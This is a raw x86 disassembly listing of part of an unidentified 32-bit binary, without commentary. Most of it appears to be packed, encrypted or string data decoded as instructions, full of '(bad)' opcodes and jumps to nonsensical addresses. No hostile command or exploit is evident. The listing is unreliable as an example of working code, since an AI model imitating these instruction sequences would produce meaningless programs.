  426ff3:	fcmovnu st,st(4)
  426ff5:	scas   eax,DWORD PTR es:[edi]
  426ff6:	popa   
  426ff7:	and    bl,BYTE PTR [ebp-0x68]
  426ffa:	fisubr WORD PTR [esi]
  426ffc:	pusha  
  426ffd:	cs out dx,eax
  426fff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427000:	xchg   DWORD PTR [edx+0x2b86c0b2],edi
  427006:	je     0x426faf
  427008:	or     DWORD PTR [esi+0x9],ebx
  42700b:	cmp    DWORD PTR [ebp-0x13],esp
  42700e:	popa   
  42700f:	or     DWORD PTR [ebx],ecx
  427011:	mov    ah,0xaa
  427013:	rcr    BYTE PTR [eax],1
  427015:	and    eax,0x35c699c9
  42701a:	push   cs
  42701b:	and    ch,dl
  42701d:	scas   eax,DWORD PTR es:[edi]
  42701e:	push   ebx
  42701f:	dec    eax
  427020:	mov    WORD PTR [ebp-0x7f249dfa],cs
  427026:	mov    al,ds:0xd8c7af1a
  42702b:	jecxz  0x427051
  42702d:	fsub   QWORD PTR [edx+0x5]
  427030:	push   0x17a889c6
  427035:	adc    ah,ah
  427037:	sahf   
  427038:	xor    DWORD PTR [edi+0x49],edi
  42703b:	fwait
  42703c:	lea    edx,[edx]
  42703e:	inc    ebx
  42703f:	(bad)  
  427040:	fs push ebx
  427042:	ds push esi
  427044:	iret   
  427045:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427046:	mov    esp,0x923cf62
  42704b:	jmp    0x66fdfa00
  427050:	adc    DWORD PTR [esi],esp
  427052:	call   0x6645db44
  427057:	or     eax,0x39306dd4
  42705c:	xchg   BYTE PTR [esi+0x1ddb3b12],bh
  427062:	push   edx
  427063:	mov    ds:0xab17392c,eax
  427068:	lock inc ecx
  42706a:	or     ebx,ecx
  42706c:	enter  0xbf11,0x4c
  427070:	loopne 0x4270cd
  427072:	adc    al,0xed
  427074:	push   cs
  427075:	lods   al,BYTE PTR ds:[esi]
  427076:	xchg   esp,eax
  427077:	jae    0x42703f
  427079:	mov    ds:0x1178964d,eax
  42707e:	push   0xffffffae
  427080:	mov    eax,0x47d9b8ae
  427085:	pop    esp
  427086:	pop    eax
  427087:	cmp    bl,BYTE PTR [esi+edi*2+0x3f]
  42708b:	cmp    BYTE PTR [ebp-0x1f],ah
  42708e:	lock lds ebx,FWORD PTR [ecx-0x7af3224a]
  427095:	into   
  427096:	xor    eax,DWORD PTR [ecx-0x6ac2db5e]
  42709c:	sbb    dh,0x21
  42709f:	scas   eax,DWORD PTR es:[edi]
  4270a0:	sub    eax,0x5ccf954e
  4270a5:	adc    al,0xb7
  4270a7:	push   eax
  4270a8:	cmp    esi,DWORD PTR [edi+0x2f]
  4270ab:	xchg   esp,eax
  4270ac:	ror    bl,cl
  4270ae:	adc    eax,0x24520da7
  4270b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270b4:	xchg   ebx,eax
  4270b5:	adc    DWORD PTR [edi],esi
  4270b7:	lahf   
  4270b8:	mov    bh,BYTE PTR [edx+0x3d495e32]
  4270be:	sbb    BYTE PTR [edx],ch
  4270c0:	test   al,0x8c
  4270c2:	test   DWORD PTR [edx],ecx
  4270c4:	push   esp
  4270c5:	adc    al,0x36
  4270c7:	mov    bh,BYTE PTR [edi+edx*8-0x4391393f]
  4270ce:	int3   
  4270cf:	aaa    
  4270d0:	fisttp QWORD PTR [esi]
  4270d2:	aam    0x62
  4270d4:	or     al,0x13
  4270d6:	iret   
  4270d7:	loope  0x4270e4
  4270d9:	test   al,0x6e
  4270db:	cmp    eax,0xe00fefc5
  4270e0:	mov    WORD PTR es:[eax+0x60b6a59d],?
  4270e7:	stc    
  4270e8:	lock int 0x98
  4270eb:	mov    ecx,0xe6f4ea57
  4270f0:	call   0xec66:0x5a4c3e08
  4270f7:	int3   
  4270f8:	fmul   st(6),st
  4270fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4270fb:	nop
  4270fc:	jbe    0x4270f4
  4270fe:	inc    ebp
  4270ff:	fcom   DWORD PTR [bx+si+0x501f]
  427104:	mov    dh,0x41
  427106:	imul   ecx,DWORD PTR [esi-0x6d],0x364c67c6
  42710d:	ins    BYTE PTR es:[edi],dx
  42710e:	cmc    
  42710f:	dec    eax
  427110:	sar    DWORD PTR [eax],1
  427112:	jmp    0xe11e:0x2dfc4c92
  427119:	jge    0x427179
  42711b:	ins    BYTE PTR es:[edi],dx
  42711c:	sbb    ch,BYTE PTR [esi+0x28]
  42711f:	jecxz  0x4270f0
  427121:	adc    ax,0xb9dc
  427125:	sub    BYTE PTR [eax-0x2a],dl
  427128:	and    eax,0x3c342c87
  42712d:	mov    ah,0xa8
  42712f:	stos   BYTE PTR es:[edi],al
  427130:	shl    BYTE PTR [eax+0x585f3fd5],cl
  427136:	(bad)  
  427138:	mov    eax,ds:0xf5dee68
  42713d:	aas    
  42713e:	mov    DWORD PTR [edi+0x4eed12b3],edi
  427144:	out    0x7e,al
  427146:	(bad)  
  427147:	ins    BYTE PTR es:[edi],dx
  427148:	retf   0xe71c
  42714b:	call   0x31ed5ce5
  427150:	les    ebp,FWORD PTR [edi-0x16]
  427153:	xchg   ecx,eax
  427154:	mov    dh,0xd1
  427156:	inc    ecx
  427157:	icebp  
  427158:	mov    dh,0xd7
  42715a:	(bad)  
  42715b:	loopne 0x427105
  42715d:	push   ds
  42715e:	fst    QWORD PTR [eax-0x79]
  427161:	or     BYTE PTR [esi+edi*4-0xe],ch
  427165:	ret    0x4cc6
  427168:	stos   DWORD PTR es:[edi],eax
  427169:	jbe    0x4270f0
  42716b:	xor    BYTE PTR [edi+0x44dddfd6],bl
  427171:	adc    edi,DWORD PTR [ebx+edx*2-0x32a7e65d]
  427178:	push   ds
  427179:	mov    DWORD PTR [edi-0x5cef72a5],ebx
  42717f:	icebp  
  427180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427181:	lahf   
  427182:	cdq    
  427183:	mov    cl,0xb1
  427185:	sub    esi,ebx
  427187:	mov    ecx,0xf993563f
  42718c:	nop
  42718d:	icebp  
  42718e:	ss std 
  427190:	retf   
  427191:	dec    edi
  427192:	xor    eax,0xc836ee8b
  427197:	(bad)  
  427198:	mov    ebp,0xc89470f5
  42719d:	(bad)  
  42719e:	and    cl,cl
  4271a0:	push   es
  4271a1:	ret    0x637f
  4271a4:	cli    
  4271a5:	jg     0x4271a0
  4271a7:	in     eax,dx
  4271a8:	dec    esi
  4271a9:	lds    edi,FWORD PTR [ebx]
  4271ab:	inc    eax
  4271ac:	les    eax,FWORD PTR [ebx-0x3b58757]
  4271b2:	std    
  4271b3:	or     ebp,ebx
  4271b5:	jbe    0x427150
  4271b7:	dec    ecx
  4271b8:	js     0x427171
  4271ba:	jnp    0x427206
  4271bc:	mov    ds:0xf3c7f79c,al
  4271c1:	imul   edx,DWORD PTR [edx-0x3ba316ce],0xa793a8cb
  4271cb:	scas   al,BYTE PTR es:[edi]
  4271cc:	test   eax,0xb2f147a
  4271d1:	retf   0xca4e
  4271d4:	mov    ch,0x0
  4271d6:	sub    bl,dl
  4271d8:	dec    esi
  4271d9:	xchg   BYTE PTR [esi],ch
  4271db:	sub    BYTE PTR [ecx],dh
  4271dd:	shr    DWORD PTR [esi-0x3a],1
  4271e0:	stos   BYTE PTR es:[edi],al
  4271e1:	xchg   ebp,eax
  4271e2:	cld    
  4271e3:	mov    cs,WORD PTR [ebx+0x51]
  4271e6:	fwait
  4271e7:	push   esi
  4271e8:	lods   al,BYTE PTR ds:[esi]
  4271e9:	add    eax,DWORD PTR [edx+0x5b]
  4271ec:	sub    DWORD PTR [edx],edx
  4271ee:	in     al,dx
  4271ef:	jge    0x427221
  4271f1:	dec    edi
  4271f2:	mov    dl,0x90
  4271f4:	popf   
  4271f5:	sub    ch,ch
  4271f7:	mov    bl,0x7d
  4271f9:	pushf  
  4271fa:	out    dx,al
  4271fb:	loopne 0x4271c4
  4271fd:	dec    esi
  4271fe:	out    0x91,eax
  427200:	nop
  427201:	sbb    edi,eax
  427203:	out    dx,al
  427204:	out    dx,eax
  427205:	push   es
  427206:	nop
  427207:	call   0xcce6e4cb
  42720c:	inc    esi
  42720d:	clc    
  42720e:	pushf  
  42720f:	popf   
  427210:	into   
  427211:	jle    0x9e4eef83
  427217:	scas   eax,DWORD PTR es:[edi]
  427218:	out    dx,eax
  427219:	pop    ebx
  42721a:	mov    edx,0x65be69b3
  42721f:	mov    al,0x48
  427221:	cmp    DWORD PTR [esi],eax
  427223:	ins    BYTE PTR es:[edi],dx
  427224:	(bad)  
  427225:	xor    ah,BYTE PTR [eax+0x33cd73e8]
  42722b:	outs   dx,BYTE PTR ds:[esi]
  42722c:	fbld   TBYTE PTR [esi+eax*2-0xb]
  427230:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427231:	push   edi
  427232:	js     0x427222
  427234:	sbb    eax,0x7b6b7528
  427239:	jae    0x427265
  42723b:	data16 int 0x94
  42723e:	imul   ecx,DWORD PTR [esi-0x268c34bb],0x2cfb535d
  427248:	popf   
  427249:	call   0x76bd:0xb78c0789
  427250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427251:	push   es
  427252:	out    0xbf,eax
  427254:	or     cl,BYTE PTR [edx+0x72cf7ae4]
  42725a:	dec    ecx
  42725b:	sahf   
  42725c:	xchg   ebp,eax
  42725d:	push   ss
  42725e:	and    ebp,DWORD PTR [ebx+0x19573911]
  427264:	pushf  
  427265:	sub    eax,0x5b3ae9a7
  42726a:	stos   DWORD PTR es:[edi],eax
  42726b:	push   0xffffffab
  42726d:	mov    cl,0xc6
  42726f:	mov    al,ds:0x18e4b39b
  427274:	jne    0x427211
  427276:	xchg   ebx,eax
  427277:	sbb    cl,BYTE PTR [edi]
  427279:	pusha  
  42727a:	add    DWORD PTR [edi+0x2acc6441],ebx
  427280:	push   ss
  427281:	add    DWORD PTR [ebx],esp
  427283:	(bad)  
  427285:	fist   DWORD PTR [eax-0x4fa4a925]
  42728b:	jmp    0x6d00:0x8a2cb7a
  427292:	push   ss
  427293:	les    edx,FWORD PTR [edi]
  427295:	mov    al,ds:0xff151f41
  42729a:	clc    
  42729b:	push   ebx
  42729c:	ss dec esi
  42729e:	push   edx
  42729f:	into   
  4272a0:	sbb    DWORD PTR [ebx+eax*1],ebp
  4272a3:	fimul  WORD PTR [ebp+0x732f3c70]
  4272a9:	xor    eax,0xa7d9a5a6
  4272ae:	(bad)  
  4272af:	jmp    0xf1b1:0xe24f8c20
  4272b6:	or     esp,DWORD PTR [esi]
  4272b8:	js     0x427328
  4272ba:	nop
  4272bb:	jns    0x42727d
  4272bd:	dec    ecx
  4272be:	ss aas 
  4272c0:	sub    dh,ah
  4272c2:	push   ecx
  4272c3:	fwait
  4272c4:	test   al,0x90
  4272c6:	and    al,0x4d
  4272c8:	int    0x9a
  4272ca:	loop   0x427287
  4272cc:	pop    eax
  4272cd:	mov    edx,DWORD PTR [esi-0x1e]
  4272d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4272d1:	nop
  4272d2:	cmp    ch,bl
  4272d4:	iret   
  4272d5:	add    eax,0xeb8d1186
  4272da:	out    0xa3,al
  4272dc:	popa   
  4272dd:	call   DWORD PTR [ebx+eax*4+0x4d]
  4272e1:	mov    edi,?
  4272e3:	and    esi,edx
  4272e5:	fstp   QWORD PTR [eax]
  4272e7:	wbinvd 
  4272e9:	push   ebp
  4272ea:	sahf   
  4272eb:	or     eax,0xdc90100d
  4272f0:	(bad)  
  4272f1:	xchg   ebx,eax
  4272f2:	sub    esp,DWORD PTR [eax-0x15]
  4272f5:	stos   BYTE PTR es:[edi],al
  4272f6:	add    BYTE PTR [ecx-0x61f53d6a],ah
  4272fc:	pop    edi
  4272fd:	push   es
  4272fe:	call   0x988d:0xc7ff8ce0
  427305:	pusha  
  427306:	cmp    eax,0xbd607e05
  42730b:	dec    edx
  42730c:	jg     0x4272db
  42730e:	pop    ds
  42730f:	loope  0x427291
  427311:	mov    ebx,0x5e797eef
  427316:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427317:	rol    DWORD PTR [edi],1
  427319:	lods   al,BYTE PTR ds:[esi]
  42731a:	(bad)
  42731d:	imul   edx,eax,0x8c73079e
  427323:	xchg   BYTE PTR [ebp+0x66],ch
  427326:	or     ah,BYTE PTR [eax]
  427328:	adc    al,0x8c
  42732a:	mov    esi,0xcb210ff
  42732f:	in     al,0x86
  427331:	pop    ds
  427332:	arpl   WORD PTR [eax],ax
  427334:	fsub   DWORD PTR [esi-0x40]
  427337:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427338:	dec    edi
  427339:	lds    esp,FWORD PTR [esi+esi*4]
  42733c:	(bad)  
  42733d:	xlat   BYTE PTR ds:[ebx]
  42733e:	and    dh,dh
  427340:	xor    eax,0x66deeb7c
  427345:	sar    ch,1
  427347:	jnp    0x4273b8
  427349:	cmp    DWORD PTR [eax+0x78d02219],edx
  42734f:	mov    cl,0xff
  427351:	cs adc al,0x28
  427354:	cmp    ecx,eax
  427356:	xor    al,bh
  427358:	fwait
  427359:	cs xor eax,0x7b232637
  42735f:	sahf   
  427360:	cmp    al,0x17
  427362:	xor    eax,0x4560eb68
  427367:	cmp    esi,DWORD PTR [ecx-0x80]
  42736a:	mov    ds:0x86a240aa,al
  42736f:	sbb    al,BYTE PTR [edi+0x47]
  427372:	jecxz  0x427326
  427374:	push   ds
  427375:	mov    bl,0x30
  427377:	push   cs
  427378:	mov    DWORD PTR [edx],esi
  42737a:	mov    bh,0x50
  42737c:	dec    ecx
  42737d:	shr    BYTE PTR [ebx],1
  42737f:	cmc    
  427380:	jns    0x42733b
  427382:	test   eax,0x2e5e879e
  427387:	ficom  DWORD PTR [edi]
  427389:	call   0x890e44c6
  42738e:	in     eax,dx
  42738f:	adc    al,0x54
  427391:	lods   eax,DWORD PTR ds:[esi]
  427392:	or     eax,0x154e00f4
  427397:	xor    edx,ecx
  427399:	xchg   DWORD PTR [ecx-0x30],edi
  42739c:	inc    eax
  42739d:	and    esi,DWORD PTR [ebx-0x11]
  4273a0:	mov    WORD PTR ss:[eax+edx*1],gs
  4273a4:	mov    ebx,0x1094dded
  4273a9:	adc    al,0x9a
  4273ab:	pop    ebx
  4273ac:	data16 rcl BYTE PTR [edi+0x1c],cl
  4273b0:	(bad)  
  4273b1:	adc    ah,BYTE PTR [edx-0x51]
  4273b4:	mov    WORD PTR [edi],cs
  4273b6:	pop    edx
  4273b7:	or     al,0x34
  4273b9:	div    ecx
  4273bb:	pop    ss
  4273bc:	imul   esi,DWORD PTR [edi+0x22],0x3ebd64a1
  4273c3:	pop    edi
  4273c4:	cmc    
  4273c5:	push   ebp
  4273c6:	sub    eax,0x8535ac31
  4273cb:	push   ebx
  4273cc:	sub    eax,0xd94054fe
  4273d1:	cli    
  4273d2:	adc    dl,BYTE PTR [eax-0x1d40b723]
  4273d8:	in     eax,dx
  4273d9:	mov    esp,0xdef5ce2d
  4273de:	(bad)  
  4273df:	jmp    0x4273ad
  4273e1:	pop    eax
  4273e2:	mov    WORD PTR [edi-0x3c8dba10],?
  4273e8:	mov    edx,0x625d0706
  4273ed:	or     ch,BYTE PTR [esi]
  4273ef:	xor    bh,BYTE PTR [edi+0x60]
  4273f2:	push   ecx
  4273f3:	cld    
  4273f4:	ins    DWORD PTR es:[edi],dx
  4273f5:	into   
  4273f6:	jecxz  0x4273f7
  4273f8:	pop    esi
  4273f9:	outs   dx,BYTE PTR ds:[esi]
  4273fa:	xor    BYTE PTR [edx+ecx*2+0x16],dh
  4273fe:	cld    
  4273ff:	jmp    0x339e:0x98c4e267
  427406:	mov    ah,0x97
  427408:	mov    eax,DWORD PTR es:[eax-0x58]
  42740c:	or     al,0x1f
  42740e:	xor    al,0xa1
  427410:	pop    ds
  427411:	push   esi
  427412:	imul   edx,DWORD PTR [edi+0x1ed7da7d],0xffffffc1
  427419:	arpl   WORD PTR [ecx+ecx*4-0xf3ee5a2],di
  427420:	add    BYTE PTR [edi],cl
  427422:	xchg   DWORD PTR [eax+0x61bd5de8],edi
  427428:	outs   dx,DWORD PTR ds:[esi]
  427429:	sar    BYTE PTR [ecx-0x62],0xb8
  42742d:	sub    ecx,DWORD PTR [ecx-0x21]
  427430:	inc    ecx
  427431:	mov    ch,dl
  427433:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427434:	hlt    
  427435:	adc    bh,cl
  427437:	icebp  
  427438:	xlat   BYTE PTR ds:[ebx]
  427439:	inc    edx
  42743a:	shl    DWORD PTR [ecx+0x9],1
  42743d:	pushf  
  42743e:	xlat   BYTE PTR ds:[ebx]
  42743f:	inc    esi
  427440:	adc    al,0xc5
  427442:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427443:	mov    esi,edx
  427445:	fistp  WORD PTR ds:0x1d368c50
  42744b:	retf   0xbc50
  42744e:	imul   esi,DWORD PTR [ebx-0x21],0x720b3ed1
  427455:	inc    ebp
  427456:	mov    dl,0x98
  427458:	xchg   DWORD PTR [edi-0x59],edx
  42745b:	rcl    ah,cl
  42745d:	xor    al,0xe1
  42745f:	hlt    
  427460:	sub    DWORD PTR [ebx-0x8],edx
  427463:	inc    eax
  427464:	mov    eax,ds:0xe06459b0
  427469:	jbe    0x427472
  42746b:	loop   0x427411
  42746d:	out    dx,eax
  42746e:	bnd jle 0x4274a2
  427471:	shl    DWORD PTR [ebx-0x1a],cl
  427474:	(bad)  
  427475:	in     al,0x91
  427477:	mov    dl,0xa1
  427479:	sub    eax,DWORD PTR ds:0x44368f1
  42747f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427480:	test   eax,0xa5626885
  427485:	imul   esp,DWORD PTR [ebp+0x25fa99b0],0x17
  42748c:	and    ebx,DWORD PTR [ecx]
  42748e:	mov    ds:0x8b2067a3,eax
  427493:	pop    esi
  427494:	fimul  WORD PTR [ebx+0x8e70]
	...
  427512:	add    BYTE PTR [eax],al
  427514:	jbe    0x427541
  427516:	dec    eax
  427517:	jbe    0x427576
  427519:	ja     0x427599
  42751b:	sub    esi,DWORD PTR [ebp-0x4b]
  42751e:	(bad)  
  42751f:	retf   0xecca
  427522:	xor    esp,ecx
  427524:	int    0x5
  427526:	add    al,BYTE PTR [eax]
  427528:	sldt   WORD PTR [eax]
  42752b:	add    BYTE PTR [ecx-0x525fa75],dl
  427531:	scas   al,BYTE PTR es:[edi]
  427532:	shl    DWORD PTR [ebx+0x49],0xe1
  427536:	sub    edx,DWORD PTR [ebx+ecx*8+0x1be8]
	...
  427591:	add    BYTE PTR [eax],al
  427593:	add    BYTE PTR [ebx],bh
  427595:	sub    al,0x10
  427597:	add    BYTE PTR [esi+0x5c001070],ch
  42759d:	and    edx,DWORD PTR [eax]
  42759f:	add    BYTE PTR [eax+0x1b],dh
  4275a2:	adc    BYTE PTR [eax],al
  4275a4:	dec    ebp
  4275a5:	adc    dl,BYTE PTR [eax]
  4275a7:	add    BYTE PTR [ebx],bl
  4275a9:	and    dl,BYTE PTR [eax]
  4275ab:	add    BYTE PTR [ecx+0x20],dh
  4275ae:	adc    BYTE PTR [eax],al
  4275b0:	cmp    edx,DWORD PTR gs:[eax]
  4275b3:	add    BYTE PTR [ebx+0x51],dl
  4275b6:	push   esi
  4275b7:	aaa    
  4275b8:	pop    edi
  4275b9:	dec    esp
  4275ba:	push   ebp
  4275bb:	ss push ebp
  4275bd:	pop    edi
  4275be:	xor    al,0x43
  4275c0:	aaa    
  4275c1:	dec    edi
  4275c2:	inc    ecx
  4275c3:	add    BYTE PTR [ebx+0x30],al
  4275c6:	xor    eax,0x47475f30
  4275cb:	push   ecx
  4275cc:	push   ebp
  4275cd:	push   ebx
  4275ce:	pop    edi
  4275cf:	xor    DWORD PTR [edx],esi
  4275d1:	inc    edi
  4275d2:	add    BYTE PTR [edi+0x45],al
  4275d5:	push   ebp
  4275d6:	pop    edi
  4275d7:	push   eax
  4275d8:	push   edx
  4275d9:	inc    ebp
  4275da:	pop    edx
  4275db:	xor    BYTE PTR [edi+0x34],bl
  4275de:	dec    edx
  4275df:	add    BYTE PTR [edx+0x4b],cl
  4275e2:	inc    edi
  4275e3:	ss pop edi
  4275e5:	push   edx
  4275e6:	dec    ecx
  4275e7:	dec    edi
  4275e8:	pop    edi
  4275e9:	push   ebp
  4275ea:	xor    dl,BYTE PTR [edi+0x0]
  4275ed:	push   edi
  4275ee:	cmp    BYTE PTR [ecx],dh
  4275f0:	pop    edi
  4275f1:	xor    eax,0x505357
  4275f6:	dec    ebx
  4275f7:	inc    esp
  4275f8:	aaa    
  4275f9:	pop    edi
  4275fa:	inc    esp
  4275fb:	cmp    BYTE PTR [eax+esi*1+0x34],dl
  4275ff:	pop    edi
  427600:	push   esi
  427601:	add    BYTE PTR [edx+ebx*2+0x42],dl
  427605:	pop    edi
  427606:	push   ebp
  427607:	push   edx
  427608:	inc    esi
  427609:	inc    ebx
  42760a:	dec    esi
  42760b:	xor    eax,DWORD PTR [eax]
  42760d:	inc    ebx
  42760e:	cmp    DWORD PTR [edx+0x5f],eax
  427611:	inc    esi
  427612:	pop    edx
  427613:	push   esi
  427614:	cmp    BYTE PTR [edi+0x4a],bl
  427617:	add    BYTE PTR [ecx+0x38],al
  42761a:	xor    ebx,DWORD PTR [edi+0x52]
  42761d:	push   ebx
  42761e:	pop    ecx
  42761f:	inc    esi
  427620:	xor    al,0x5f
  427622:	xor    eax,0x5a005157
  427627:	push   ebp
  427628:	xor    dh,BYTE PTR [esi]
  42762a:	xor    bl,BYTE PTR [edi+0x33]
  42762d:	inc    esp
  42762e:	push   esi
  42762f:	dec    esp
  427630:	push   ebx
  427631:	pop    edi
  427632:	xor    al,0x0
  427634:	push   ebx
  427635:	cmp    DWORD PTR [ebp+0x33],eax
  427638:	cmp    BYTE PTR [edi+0x59],bl
  42763b:	xor    DWORD PTR [edi+ebx*2+0x46],eax
  42763f:	dec    ebx
  427640:	cmp    DWORD PTR [edx+ebx*2+0x0],ecx
  427644:	inc    esi
  427645:	xor    al,0x48
  427647:	pop    edi
  427648:	xor    ecx,DWORD PTR [eax+0x37]
  42764b:	cmp    DWORD PTR [edi+0x37],ebx
  42764e:	dec    esi
  42764f:	xor    al,0x51
  427651:	add    BYTE PTR [ebx+0x56],dl
  427654:	push   esp
  427655:	pop    edi
  427656:	xor    al,0x37
  427658:	xor    eax,0x325f3353
  42765d:	add    BYTE PTR [eax+0x59],bl
  427660:	inc    esp
  427661:	pop    edi
  427662:	dec    ebx
  427663:	push   esp
  427664:	dec    esp
  427665:	inc    esp
  427666:	pop    edi
  427667:	cmp    DWORD PTR [eax],eax
  427669:	push   edi
  42766a:	dec    eax
  42766b:	push   edi
  42766c:	pop    edi
  42766d:	inc    ebp
  42766e:	dec    esp
  42766f:	inc    ecx
  427670:	xor    DWORD PTR [edi+0x47],ebx
  427673:	add    BYTE PTR [edx+eax*2+0x51],dl
  427677:	pop    edi
  427678:	xor    eax,0x5137385a
  42767d:	xor    eax,0x574d5400
  427682:	pop    edi
  427683:	xor    DWORD PTR [edx+ebx*2+0x53],edx
  427687:	pop    edi
  427688:	pop    eax
  427689:	xor    BYTE PTR [ecx+0x5f],cl
  42768c:	xor    eax,0x33420030
  427691:	xor    al,0x32
  427693:	xor    DWORD PTR [edi+0x58],ebx
  427696:	inc    ecx
  427697:	dec    esi
  427698:	pop    edi
  427699:	inc    edx
  42769a:	push   ebp
  42769b:	push   ecx
  42769c:	add    BYTE PTR [ebp+0x31],al
  42769f:	ss pop edi
  4276a1:	xor    BYTE PTR [eax+0x4c],cl
  4276a4:	pop    edi
  4276a5:	cmp    DWORD PTR [ebp+0x53],edx
  4276a8:	add    BYTE PTR [ebp+0x41],al
  4276ab:	dec    eax
  4276ac:	cmp    BYTE PTR [edi+0x35],bl
  4276af:	dec    esi
  4276b0:	push   ebx
  4276b1:	dec    ebx
  4276b2:	add    BYTE PTR [edi+0x38],dl
  4276b5:	xor    DWORD PTR [edi+0x48],ebx
  4276b8:	xor    DWORD PTR [ebp+0x4e],eax
  4276bb:	ss pop edi
  4276bd:	dec    eax
  4276be:	cmp    DWORD PTR [edx+0x0],eax
  4276c1:	push   esp
  4276c2:	aaa    
  4276c3:	xor    bh,BYTE PTR [ecx]
  4276c5:	xor    al,0x31
  4276c7:	pop    edi
  4276c8:	push   edx
  4276c9:	push   edi
  4276ca:	push   edx
  4276cb:	dec    ecx
  4276cc:	add    BYTE PTR [esi+0x4d],al
  4276cf:	push   edi
  4276d0:	pop    edi
  4276d1:	pop    ecx
  4276d2:	xor    eax,0x45395a
  4276d7:	pop    eax
  4276d8:	dec    eax
  4276d9:	aaa    
  4276da:	pop    edi
  4276db:	xor    dl,BYTE PTR [ebx+0x39]
  4276de:	xor    dh,BYTE PTR [esi]
  4276e0:	xor    eax,0x3936525f
  4276e5:	add    BYTE PTR [ebx+0x50],cl
  4276e8:	inc    ecx
  4276e9:	pop    edi
  4276ea:	xor    eax,0x364c3737
  4276ef:	xor    BYTE PTR [ecx+0x0],dl
  4276f2:	push   ebx
  4276f3:	push   ebx
  4276f4:	inc    ebx
  4276f5:	xor    bl,BYTE PTR [edi+0x57]
  4276f8:	xor    BYTE PTR [ecx+0x43],al
  4276fb:	push   esp
  4276fc:	xor    eax,0x414a004e
  427701:	inc    ecx
  427702:	pop    edi
  427703:	cmp    DWORD PTR [esi+0x32],edx
  427706:	pop    edi
  427707:	xor    bh,BYTE PTR [ecx]
  427709:	add    BYTE PTR [ebx+0x42],cl
  42770c:	dec    esp
  42770d:	pop    edi
  42770e:	push   esi
  42770f:	xor    eax,0x47004c55
  427714:	xor    ecx,DWORD PTR [eax+0x5f]
  427717:	push   ecx
  427718:	dec    edi
  427719:	push   esp
  42771a:	cmp    BYTE PTR [eax+0x5f],dl
  42771d:	dec    ecx
  42771e:	add    BYTE PTR [ebp+0x33],cl
  427721:	inc    ebp
  427722:	pop    edi
  427723:	inc    edi
  427724:	dec    edi
  427725:	xor    eax,0x455f3249
  42772a:	add    BYTE PTR [edx+0x47],cl
  42772d:	xor    eax,0x4338535f
  427732:	dec    ecx
  427733:	xor    dh,BYTE PTR [eax]
  427735:	pop    edi
  427736:	push   eax
  427737:	add    BYTE PTR [eax+0x0],dl
  42773a:	pop    eax
  42773b:	add    BYTE PTR [eax+eax*1+0x5f],al
  42773f:	add    BYTE PTR [eax+0x0],cl
  427742:	aaa    
  427743:	add    BYTE PTR [ecx+0x0],bl
  427746:	aaa    
  427747:	add    BYTE PTR [edi+0x0],bl
  42774a:	inc    esi
  42774b:	add    BYTE PTR [edi],dh
  42774d:	add    BYTE PTR [ecx+0x0],bl
  427750:	inc    esp
  427751:	add    BYTE PTR [edi+0x0],bl
  427754:	xor    eax,0x52000000
  427759:	add    BYTE PTR [eax+0x0],dl
  42775c:	inc    esi
  42775d:	add    BYTE PTR [edi+0x0],bl
  427760:	dec    esp
  427761:	add    BYTE PTR [ecx+0x0],al
  427764:	push   eax
  427765:	add    BYTE PTR [edi+0x0],bl
  427768:	inc    ecx
  427769:	add    BYTE PTR [edi],dh
  42776b:	add    BYTE PTR [eax+eax*1+0x4a],al
  42776f:	add    BYTE PTR [ebp+0x0],al
  427772:	pop    edi
  427773:	add    BYTE PTR [eax+eax*1],dh
  427776:	add    BYTE PTR [eax],al
  427778:	dec    esp
  427779:	add    BYTE PTR [edi],dh
  42777b:	add    BYTE PTR [ebp+0x0],cl
  42777e:	cmp    BYTE PTR [eax],al
  427780:	xor    al,BYTE PTR [eax]
  427782:	pop    edi
  427783:	add    BYTE PTR [eax],bh
  427785:	add    BYTE PTR [ecx+0x0],al
  427788:	pop    edx
  427789:	add    BYTE PTR [edx+0x0],bl
  42778c:	pop    edi
  42778d:	add    BYTE PTR [ebx],dh
  42778f:	add    BYTE PTR [ebx+0x0],dl
  427792:	add    BYTE PTR [eax],al
  427794:	push   esi
  427795:	add    BYTE PTR [eax],bh
  427797:	add    BYTE PTR [esi+0x0],dl
  42779a:	xor    al,BYTE PTR [eax]
  42779c:	pop    edi
  42779d:	add    BYTE PTR [esi+0x0],al
  4277a0:	inc    ebx
  4277a1:	add    BYTE PTR [edi+0x0],al
  4277a4:	push   edi
  4277a5:	add    BYTE PTR [edi+0x0],bl
  4277a8:	dec    eax
  4277a9:	add    BYTE PTR [edx+0x0],cl
  4277ac:	cmp    DWORD PTR [eax],eax
  4277ae:	aaa    
  4277af:	add    BYTE PTR [eax],al
  4277b1:	add    BYTE PTR [ecx+0x0],cl
  4277b4:	dec    edx
  4277b5:	add    BYTE PTR [ecx+0x0],al
  4277b8:	pop    edi
  4277b9:	add    BYTE PTR [edx+0x0],cl
  4277bc:	inc    esi
  4277bd:	add    BYTE PTR [edi+0x0],dl
  4277c0:	xor    eax,DWORD PTR [eax]
  4277c2:	dec    ebp
  4277c3:	add    BYTE PTR [edi+0x0],bl
  4277c6:	push   eax
  4277c7:	add    BYTE PTR [ecx+0x0],al
  4277ca:	add    BYTE PTR [eax],al
  4277cc:	dec    edi
  4277cd:	add    BYTE PTR [ecx+0x0],bl
  4277d0:	dec    eax
  4277d1:	add    BYTE PTR [edi+0x0],bl
  4277d4:	xor    eax,0x33005000
  4277d9:	add    BYTE PTR [esi+0x0],al
  4277dc:	push   esi
  4277dd:	add    BYTE PTR [edi+0x0],bl
  4277e0:	push   ebx
  4277e1:	add    BYTE PTR [ecx+0x0],dl
  4277e4:	push   ebp
  4277e5:	add    BYTE PTR [eax],al
  4277e7:	add    BYTE PTR [esi+0x0],al
  4277ea:	dec    esp
  4277eb:	add    BYTE PTR [ecx],dh
  4277ed:	add    BYTE PTR [edi+0x0],bl
